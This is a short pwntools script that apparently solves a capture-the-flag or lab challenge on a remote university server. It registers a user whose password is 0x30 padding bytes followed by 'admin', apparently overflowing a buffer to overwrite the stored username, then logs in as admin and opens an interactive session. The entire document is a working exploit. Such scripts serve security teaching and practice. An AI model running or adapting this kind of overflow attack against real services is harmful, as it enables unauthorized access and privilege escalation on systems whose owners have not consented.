from pwn import *

port = 10034
rem = remote("kayle.snu.ac.kr", port)

rem.sendlineafter(b"> ", b"1")

rem.sendlineafter(b'username?', b"A")

payload = b'A' * 0x30 + b"admin"
rem.sendlineafter(b'password?', payload)

rem.sendlineafter(b"> ", b"2")
rem.sendlineafter(b"Username: ", b"admin")
rem.sendlineafter(b"Password: ", payload)

rem.sendlineafter(b"> ", b"4")
rem.recvuntil(b"admin\n")
rem.interactive()